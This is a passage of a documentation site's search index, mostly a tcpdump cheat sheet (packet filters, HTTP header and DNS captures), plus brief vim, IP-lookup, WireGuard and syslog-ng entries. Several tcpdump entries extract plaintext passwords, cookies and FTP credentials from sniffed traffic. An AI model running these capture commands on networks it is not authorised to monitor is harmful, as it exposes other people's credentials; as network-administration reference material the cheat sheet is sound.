'tcp[13] & 32!=0' tcpdump 'tcp[tcpflags] == tcp-urg'","title":"Isolate TCP URG flags."},{"location":"linux/tcpdump/#isolate-tcp-ack-flags","text":"tcpdump 'tcp[13] & 16!=0' tcpdump 'tcp[tcpflags] == tcp-ack'","title":"Isolate TCP ACK flags."},{"location":"linux/tcpdump/#isolate-tcp-psh-flags","text":"tcpdump 'tcp[13] & 8!=0' tcpdump 'tcp[tcpflags] == tcp-psh'","title":"Isolate TCP PSH flags."},{"location":"linux/tcpdump/#isolate-tcp-fin-flags","text":"tcpdump 'tcp[13] & 1!=0' tcpdump 'tcp[tcpflags] == tcp-fin'","title":"Isolate TCP FIN flags."},{"location":"linux/tcpdump/#commands-that-i-using-almost-daily","text":"","title":"Commands that I using almost daily"},{"location":"linux/tcpdump/#both-syn-and-rst-set","text":"tcpdump 'tcp[13] = 6'","title":"Both SYN and RST Set"},{"location":"linux/tcpdump/#find-http-user-agents","text":"tcpdump -vvAls0 | grep 'User-Agent:' tcpdump -nn -A -s1500 -l | grep \"User-Agent:\"","title":"Find HTTP User Agents"},{"location":"linux/tcpdump/#by-using-egrep-and-multiple-matches-we-can-get-the-user-agent-and-the-host-or-any-other-header-from-the-request","text":"tcpdump -nn -A -s1500 -l | egrep -i 'User-Agent:|Host:'","title":"By using egrep and multiple matches we can get the User Agent and the Host (or any other header) from the request."},{"location":"linux/tcpdump/#capture-only-http-get-and-post-packets-only-packets-that-match-get","text":"tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'","title":"Capture only HTTP GET and POST packets only packets that match GET."},{"location":"linux/tcpdump/#extract-http-request-urls","text":"tcpdump -s 0 -v -n -l | egrep -i \"POST /|GET /|Host:\"","title":"Extract HTTP Request URL's"},{"location":"linux/tcpdump/#extract-http-passwords-in-post-requests","text":"tcpdump -s 0 -A -n -l | egrep -i \"POST /|pwd=|passwd=|password=|Host:\"","title":"Extract HTTP Passwords in POST Requests"},{"location":"linux/tcpdump/#capture-cookies-from-server-and-from-client","text":"tcpdump -nn -A -s0 -l | egrep -i 'Set-Cookie|Host:|Cookie:'","title":"Capture Cookies from Server and from Client"},{"location":"linux/tcpdump/#capture-all-icmp-packets","text":"tcpdump -n icmp","title":"Capture all ICMP packets"},{"location":"linux/tcpdump/#show-icmp-packets-that-are-not-echoreply-standard-ping","text":"tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'","title":"Show ICMP Packets that are not ECHO/REPLY (standard ping)"},{"location":"linux/tcpdump/#capture-smtp--pop3-email","text":"tcpdump -nn -l port 25 | grep -i 'MAIL FROM\\|RCPT TO'","title":"Capture SMTP / POP3 Email"},{"location":"linux/tcpdump/#troubleshooting-ntp-query-and-response","text":"tcpdump dst port 123","title":"Troubleshooting NTP Query and Response"},{"location":"linux/tcpdump/#capture-ftp-credentials-and-commands","text":"tcpdump -nn -v port ftp or ftp-data","title":"Capture FTP Credentials and Commands"},{"location":"linux/tcpdump/#rotate-capture-files","text":"tcpdump -w /tmp/capture-%H.pcap -G 3600 -C 200","title":"Rotate Capture Files"},{"location":"linux/tcpdump/#capture-ipv6-traffic","text":"tcpdump -nn ip6 proto 6","title":"Capture IPv6 Traffic"},{"location":"linux/tcpdump/#ipv6-with-udp-and-reading-from-a-previously-saved-capture-file","text":"tcpdump -nr ipv6-test.pcap ip6 proto 17","title":"IPv6 with UDP and reading from a previously saved capture file."},{"location":"linux/tcpdump/#detect-port-scan-in-network-traffic","text":"tcpdump -nn","title":"Detect Port Scan in Network Traffic"},{"location":"linux/tcpdump/#usage-example_1","text":"","title":"USAGE EXAMPLE"},{"location":"linux/tcpdump/#example-filter-showing-nmap-nse-script-testing","text":"On Target: nmap -p 80 \u2013script=http-enum.nse targetip On Server: tcpdump -nn port 80 | grep \"GET /\" GET /w3perl/ HTTP/1.1 GET /w-agora/ HTTP/1.1 GET /way-board/ HTTP/1.1 GET /web800fo/ HTTP/1.1 GET /webaccess/ HTTP/1.1 GET /webadmin/ HTTP/1.1 GET /webAdmin/ HTTP/1.1","title":"Example Filter Showing Nmap NSE Script Testing"},{"location":"linux/tcpdump/#capture-start-and-end-packets-of-every-non-local-host","text":"tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'","title":"Capture Start and End Packets of every non-local host"},{"location":"linux/tcpdump/#capture-dns-request-and-response","text":"tcpdump -i wlp58s0 -s0 port 53","title":"Capture DNS Request and Response"},{"location":"linux/tcpdump/#capture-http-data-packets","text":"tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'","title":"Capture HTTP data packets"},{"location":"linux/tcpdump/#capture-with-tcpdump-and-view-in-wireshark","text":"ssh wuseman@localhost 'tcpdump -s0 -c 1000 -nn -w - not port 22' | wireshark -k -i -","title":"Capture with tcpdump and view in Wireshark"},{"location":"linux/tcpdump/#top-hosts-by-packets","text":"tcpdump -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20","title":"Top Hosts by Packets"},{"location":"linux/tcpdump/#capture-all-the-plaintext-passwords","text":"tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user '","title":"Capture all the plaintext passwords"},{"location":"linux/tcpdump/#dhcp-example","text":"tcpdump -v -n port 67 or 68","title":"DHCP Example"},{"location":"linux/tcpdump/#cleartext-get-requests","text":"tcpdump -vvAls0 | grep 'GET'","title":"Cleartext GET Requests"},{"location":"linux/tcpdump/#find-http-host-headers","text":"tcpdump -vvAls0 | grep 'Host:'","title":"Find HTTP Host Headers"},{"location":"linux/tcpdump/#find-http-cookies","text":"tcpdump -vvAls0 | grep 'Set-Cookie|Host:|Cookie:'","title":"Find HTTP Cookies"},{"location":"linux/tcpdump/#find-ssh-connections","text":"tcpdump 'tcp[(tcp[12]>>2):4] = 0x5353482D'","title":"Find SSH Connections"},{"location":"linux/tcpdump/#find-dns-traffic","text":"tcpdump -vvAs0 port 53","title":"Find DNS Traffic"},{"location":"linux/tcpdump/#find-ftp-traffic","text":"tcpdump -vvAs0 port ftp or ftp-data","title":"Find FTP Traffic"},{"location":"linux/tcpdump/#find-ntp-traffic","text":"tcpdump -vvAs0 port 123","title":"Find NTP Traffic"},{"location":"linux/tcpdump/#capture-smtp--pop3-email_1","text":"tcpdump -nn -l port 25 | grep -i 'MAIL FROM\\|RCPT TO'","title":"Capture SMTP / POP3 Email"},{"location":"linux/tcpdump/#line-buffered-mode","text":"tcpdump -i eth0 -s0 -l port 80 | grep 'Server:'","title":"Line Buffered Mode"},{"location":"linux/tcpdump/#find-traffic-with-evil-bit","text":"tcpdump 'ip[6] & 128 != 0'","title":"Find traffic with evil bit"},{"location":"linux/tcpdump/#filter-on-protocol-icmp-and-protocol-specific-fields-icmp-type","text":"tcpdump -n icmp and 'icmp[0] != 8 and icmp[0] != 0'","title":"Filter on protocol (ICMP) and protocol-specific fields (ICMP type)"},{"location":"linux/tcpdump/#same-command-can-be-used-with-predefined-header-field-offset-icmptype-and-icmp-type-field-values-icmp-echo-and-icmp-echoreply","text":"tcpdump -n icmp and icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply","title":"Same command can be used with predefined header field offset (icmptype) and ICMP type field values (icmp-echo and icmp-echoreply):"},{"location":"linux/tcpdump/#filter-on-tos-field","text":"tcpdump -v -n ip and ip[1]!=0","title":"Filter on TOS field"},{"location":"linux/tcpdump/#filter-on-ttl-field","text":"tcpdump -v ip and 'ip[8]<2'","title":"Filter on TTL field"},{"location":"linux/tcpdump/#filter-on-tcp-flags-synack","text":"tcpdump -n tcp and port 80 and 'tcp[tcpflags] & tcp-syn == tcp-syn'","title":"Filter on TCP flags (SYN/ACK)"},{"location":"linux/tcpdump/#in-the-example-above-all-packets-with-tcp-syn-flag-set-are-captured-other-flags-ack-for-example-might-be-set-also-packets-which-have-only-tcp-syn-flags-set-can-be-captured","text":"tcpdump tcp and port 80 and 'tcp[tcpflags] == tcp-syn'","title":"In the example above, all packets with TCP SYN flag set are captured. Other flags (ACK, for example) might be set also. Packets which have only TCP SYN flags set, can be captured"},{"location":"linux/tcpdump/#catch-tcp-synack-packets-typically-responses-from-servers","text":"tcpdump -n tcp and 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' tcpdump -n tcp and 'tcp[tcpflags] & tcp-syn == tcp-syn' and 'tcp[tcpflags] & tcp-ack == tcp-ack'","title":"Catch TCP SYN/ACK packets (typically, responses from servers):"},{"location":"linux/tcpdump/#catch-arp-packets","text":"tcpdump -vv -e -nn ether proto 0x0806","title":"Catch ARP packets"},{"location":"linux/tcpdump/#filter-on-ip-packet-length","text":"tcpdump -l icmp and '(ip[2:2]>50)' -w - |tcpdump -r - -v ip and '(ip[2:2]<60)'","title":"Filter on IP packet length"},{"location":"linux/tcpdump/#remark-due-to-some-bug-in-tcpdump-the-following-command-doesnt-catch-packets-as-expected","text":"tcpdump -v -n icmp and '(ip[2:2]>50)' and '(ip[2:2]<60)'","title":"Remark: due to some bug in tcpdump, the following command doesn't catch packets as expected:"},{"location":"linux/tcpdump/#filter-on-encapsulated-content-icmp-within-pppoe","text":"tcpdump -v -n icmp","title":"Filter on encapsulated content (ICMP within PPPoE)"},{"location":"linux/tcpdump/#queiter","text":"tcpdump -q -i eth0 tcpdump -t -i eth0 tcpdump -A -n -q -i eth0 'port 80' tcpdump -A -n -q -t -i eth0 'port 80'","title":"Queiter"},{"location":"linux/tcpdump/#print-only-useful-packets-from-the-http-traffic","text":"tcpdump -A -s 0 -q -t -i eth0 'port 80 and ( ((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12:2]&0xf0)>>2)) != 0)'","title":"Print only useful packets from the HTTP traffic"},{"location":"linux/tcpdump/#dump-sip-traffic","text":"tcpdump -nq -s 0 -A -vvv port 5060 and host 1.2.3.4","title":"Dump SIP Traffic"},{"location":"linux/tcpdump/#checking-packet-content","text":"tcpdump -i any -c10 -nn -A port 80","title":"Checking packet content"},{"location":"linux/tcpdump/#checking-packet-content_1","text":"sudo tcpdump -i any -c10 -nn -A port 80","title":"Checking packet content"},{"location":"linux/tcpdump/#references--awesome-wikis","text":"https://hackertarget.com/tcpdump-examples/ https://wiki.geant.org/display/public/EK/TcpdumpExamples http://edoceo.com/cli/tcpdump https://www.thegeekstuff.com/2010/08/tcpdump-command-examples/ https://opensource.com/article/18/10/introduction-tcpdump https://programming.vip/docs/tcpdump-and-some-default-ports-of-linux.html https://www.hackingarticles.in/comprehensive-guide-to-tcpdump-part-1/ https://www.hackingarticles.in/comprehensive-guide-to-tcpdump-part-2/ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf https://sectools.org/tool/tcpdump/","title":"References &amp; Awesome wikis"},{"location":"linux/tcpdump/#contact","text":"If you have problems, questions, ideas or suggestions please contact us by posting to wuseman@nr1.nu","title":"CONTACT"},{"location":"linux/tcpdump/#web-site","text":"Visit our homepage for the latest info and updated tools https://nr1.nu & @wuseman","title":"WEB SITE"},{"location":"linux/tcpdump/#end","text":"","title":"END!"},{"location":"linux/vim/","text":"vim Merge every string after hash above everything to the left, see preview for explanation : %s /\\(.*[^ ]\\+\\) *\\(# .*\\)/ \\ 2 \\ r \\ 1 /\"","title":"vim"},{"location":"linux/vim/#vim","text":"","title":"vim"},{"location":"linux/vim/#merge-every-string-after-hash-above-everything-to-the-left-see-preview-for-explanation","text":": %s /\\(.*[^ ]\\+\\) *\\(# .*\\)/ \\ 2 \\ r \\ 1 /\"","title":"Merge every string after hash above everything to the left, see preview for explanation"},{"location":"linux/whatismyip/","text":"whatismyip Various ways to print your WAN IP -Address: Curl curl -s https://w.nr1.nu/i curl -s https://w.nr1.nu/i/ curl -s http://wtfismyip.com/text curl -s https://ifconfig.co curl -s checkip.dyndns.org | grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' Wget wget -qO - https://w.nr1.nu/i/ wget -O - -q icanhazip.com wget -qO- ifconfig.me/ip wget http://icanhazip.com -qO-","title":"whatismyip"},{"location":"linux/whatismyip/#whatismyip","text":"Various ways to print your WAN IP -Address:","title":"whatismyip"},{"location":"linux/whatismyip/#curl","text":"curl -s https://w.nr1.nu/i curl -s https://w.nr1.nu/i/ curl -s http://wtfismyip.com/text curl -s https://ifconfig.co curl -s checkip.dyndns.org | grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}'","title":"Curl"},{"location":"linux/whatismyip/#wget","text":"wget -qO - https://w.nr1.nu/i/ wget -O - -q icanhazip.com wget -qO- ifconfig.me/ip wget http://icanhazip.com -qO-","title":"Wget"},{"location":"linux/wireguard/","text":"wireguard Required Kernel Settings CONFIG_WIREGUARD CONFIG_NETFILTER_XT_MARK CONFIG_NETFILTER_XT_CONNMARK CONFIG_NETFILTER_XT_MATCH_COMMENT CONFIG_NETFILTER_XT_MATCH_ADDRTYPE CONFIG_IP6_NF_RAW CONFIG_IP_NF_RAW","title":"wireguard"},{"location":"linux/wireguard/#wireguard","text":"Required Kernel Settings CONFIG_WIREGUARD CONFIG_NETFILTER_XT_MARK CONFIG_NETFILTER_XT_CONNMARK CONFIG_NETFILTER_XT_MATCH_COMMENT CONFIG_NETFILTER_XT_MATCH_ADDRTYPE CONFIG_IP6_NF_RAW CONFIG_IP_NF_RAW","title":"wireguard"},{"location":"linux/syslog-ng/syslog-conf.ng/","text":"syslog-ng config Log sshd successes and failures filter f_ssh { program ( ^sshd$ ) ; } ; destination d_ssh { file ( \"/var/log/ssh.fail\" fsync ( no )) ; } ; log { source ( src ) ; filter ( f_ssh ) ; destination ( d_ssh ) ; } ; Filter by programlist filter f_whitelist { in -list ( \"/etc/syslog-ng/programlist.list\" , value ( \"PROGRAM\" )) ; } ; log { source ( src ) ; filter ( f_whitelist ) ; destination ( d_remote ) ; } ; IPtables The assumption in this example is that the LOGCHAIN chain is part of a larger ruleset that routes traffic to it. Whenever the syslog-ng OSE created rule is there, packets can flow, otherwise the port is closed. source { network ( transport ( udp ) hook-commands ( startup ( \"iptables -I LOGCHAIN 1 -p udp --dport 514 -j ACCEPT\" ) shutdown ( \"iptables -D LOGCHAIN 1\" ) ) ) ; } ;","title":"syslog-ng"},{"location":"linux/syslog-ng/syslog-conf.ng/#syslog-ng-config","text":"","title":"syslog-ng config"},{"location":"linux/syslog-ng/syslog-conf.ng/#log-sshd-successes-and-failures","text":"filter f_ssh { program ( ^sshd$ ) ; } ; destination d_ssh { file ( \"/var/log/ssh.fail\" fsync ( no )) ; } ; log { source ( src ) ; filter ( f_ssh ) ; destination ( d_ssh ) ; } ;","title":"Log sshd successes and failures"},{"location":"linux/syslog-ng/syslog-conf.ng/#filter-by-programlist","text":"filter f_whitelist { in -list ( \"/etc/syslog-ng/programlist.list\" , value ( \"PROGRAM\" )) ; } ; log { source ( src ) ; filter ( f_whitelist ) ; destination ( d_remote ) ; } ;","title":"Filter by programlist"},{"location":"linux/syslog-ng/syslog-conf.ng/#iptables","text":"The assumption in this example is that the LOGCHAIN chain is part of a larger ruleset that routes traffic to it. Whenever the syslog-ng OSE created rule is there, packets can flow, otherwise the port is closed. source { network ( transport ( udp ) hook-commands ( startup ( \"iptables -I LOGCHAIN 1 -p udp --dport 514 -j ACCEPT\" ) shutdown ( \"iptables -D LOGCHAIN 1\" ) ) ) ; } ;","title":"IPtables"}]}